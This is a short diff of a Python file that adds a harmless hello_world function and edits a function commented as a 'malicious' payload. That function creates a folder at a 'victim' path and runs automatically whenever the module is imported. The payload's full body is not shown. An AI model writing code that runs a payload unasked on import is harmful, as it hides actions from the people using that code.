@@ -1,9 +1,12 @@
 import os
 import shutil
 
+def hello_world():
+    print("Hello, world!")
+
 # Malicious function to execute payload
 def execute_payload():
-    victim_directory = 'D:/legitimate-repo/malicious_folder'
+    victim_directory = 'D:/victim-repository/malicious_folder'
     if not os.path.exists(victim_directory):
         os.makedirs(victim_directory)
 
@@ -13,3 +16,4 @@ def execute_payload():
 
 # Optionally, call the payload execution automatically on import
 execute_payload()
+
